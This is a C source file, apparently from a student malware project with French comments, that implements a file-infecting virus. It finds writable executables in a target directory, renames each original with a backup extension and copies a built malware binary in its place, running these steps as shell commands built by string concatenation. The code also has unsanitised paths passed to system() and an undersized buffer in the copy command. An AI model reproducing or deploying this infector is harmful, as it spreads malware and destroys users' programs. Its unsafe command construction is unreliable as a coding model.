
#include "malwareUtils.h"
#include "malwareBuilder.h"
#include <unistd.h>

/**
 * @return Execute la command puis renvoie un char* contenant le résultat
*/
void getAllFile_exec(char* command,MalwareBuilder *malware) {
    
    char buffer[1024];
    FILE* pipe = popen(command, "r");

    if (pipe == NULL) {
        printf("Failed to run command\n");
        return;
    }
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {

        // Remove trailing newline
        buffer[strcspn(buffer, "\n")] = 0;

        isInfected(buffer,malware);

    }


    pclose(pipe);
}


int infect_prog(char *path, MalwareBuilder *malware){

    //move le fichier sains vers une extension .old
    char *cmd_move = malloc(strlen(path)*2 + strlen(malware->defaultExtensionName) +  1);
    strcpy(cmd_move, "mv ");
    strcat(cmd_move, path);
    strcat(cmd_move, " ");
    strcat(cmd_move, path);
    strcat(cmd_move, malware->defaultExtensionName);
    
    system(cmd_move);
    free(cmd_move);

    // copie le malware dans le fichier sains
    char *cmd_copy = malloc(strlen(path)*2 + strlen(malware->defaultExtensionName) +  1);
    strcpy(cmd_copy, "cp build/");
    strcat(cmd_copy, malware->malwareName);
    strcat(cmd_copy, " ");
    strcat(cmd_copy, path);
    system(cmd_copy);
    free(cmd_copy);

    return 0;
}


int isInfected(char *path, MalwareBuilder *malware){

    char *malware_path = malloc(strlen(path) + strlen(malware->defaultExtensionName) +  1);
    strcpy(malware_path, path);
    strcat(malware_path,malware->defaultExtensionName);

    //printf("malware_path: %s\n",path);

    // Vérifie si le fichier sains en .old existe déjà
    if (access(malware_path, F_OK) == 0 && access(path, F_OK) == 0) {
        //printf("Virus is already there %s\n",path);
        // // Vérifie si le fichier sains existe
        // if (access(path, F_OK) == 0) {
        //     // Si il existe alors l'attaque est présente et le malware doit executer l'ancien programme
        //     printf("Virus already exist sleeping... %s\n",malware_path);
        // }
        // else{
        //     // le virus est manquant mais le .old existe déjà
        //     //infect_prog(path,malware);

        //     printf("Virus does not exist but .old exist... %s\n",malware_path);
        // }
        free(malware_path);
        
        return 0;
    } 
    // Si il n'existe pas alors l'attaque n'est pas perpetré sur ce fichier
    else {
        //printf("File does not exist, poisoning... %s\n",path);
        infect_prog(path,malware);
        free(malware_path);
        return 1;}
    }




char *getUserWorldWritableFiles(MalwareBuilder *malware){

    char *str1 = "find ";
    char *str2 = " -path './bin/*' -executable -not -name '*.old' -writable -type f -exec ls -l {} \\; 2>/dev/null | cut -d ' ' -f9-";
    char *full_cmd = malloc(strlen(str1) + strlen(malware->defaultRepository) * 2+ strlen(str2) + 1);

    
    strcpy(full_cmd, str1);
    strcat(full_cmd, malware->defaultRepository);
    strcat(full_cmd, str2);



    //printf("command: %s\n",malware->defaultRepository);
    getAllFile_exec(full_cmd,malware);
    free(full_cmd);



    return "result";
}



char *getUserCurentDir(){
    char *buf;
    buf=(char *)malloc(100*sizeof(char));
    getcwd(buf,100);
    return buf;
}





